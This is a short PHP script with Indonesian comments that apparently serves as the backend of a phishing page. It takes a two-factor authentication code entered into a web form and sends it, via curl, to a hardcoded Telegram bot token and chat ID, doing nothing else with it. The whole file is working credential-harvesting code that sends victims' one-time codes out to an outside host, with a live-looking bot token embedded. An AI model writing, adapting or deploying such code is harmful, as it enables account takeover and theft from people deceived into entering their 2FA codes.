<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Pastikan data dari form diterima
    if (isset($_POST['code2fa']) && !empty($_POST['code2fa'])) {
        $code2fa = htmlspecialchars($_POST['code2fa']); // Hindari input berbahaya

        // Token bot Telegram Anda
        $botToken = '7672236652:AAHZDwEh11fH6TUpAzALYdnNWfa2mT7wiCE';
        // ID chat tujuan
        $chatId = '6551804744';

        // Pesan yang akan dikirim
        $message = "Kode 2FA yang dimasukkan: $code2fa";

        // Endpoint API Telegram
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        // Mengirim pesan menggunakan curl
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Validasi respons dari API Telegram
        if ($httpCode === 200) {
            echo "Pesan berhasil dikirim!";
        } else {
            echo "Gagal mengirim pesan. Kode HTTP: $httpCode<br>Response: $response";
        }
    } else {
        echo "Kode 2FA tidak boleh kosong.";
    }
} else {
    echo "Akses tidak diizinkan.";
}
